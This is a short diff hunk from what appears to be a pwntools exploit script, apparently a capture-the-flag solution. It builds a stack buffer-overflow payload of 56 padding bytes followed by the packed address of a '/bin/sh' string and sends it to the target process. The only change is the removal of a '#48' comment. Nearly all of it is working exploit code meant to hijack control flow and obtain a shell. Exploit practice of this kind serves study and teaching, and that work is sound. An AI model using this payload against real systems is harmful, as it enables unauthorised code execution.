@@ -8,7 +8,6 @@ log.info('binsh: {}'.format(hex(binshSearch)))
 
 buf = b''
 buf += b'A' * 56
-#48
 buf += p64(binshSearch)
 
 r.sendline(buf)
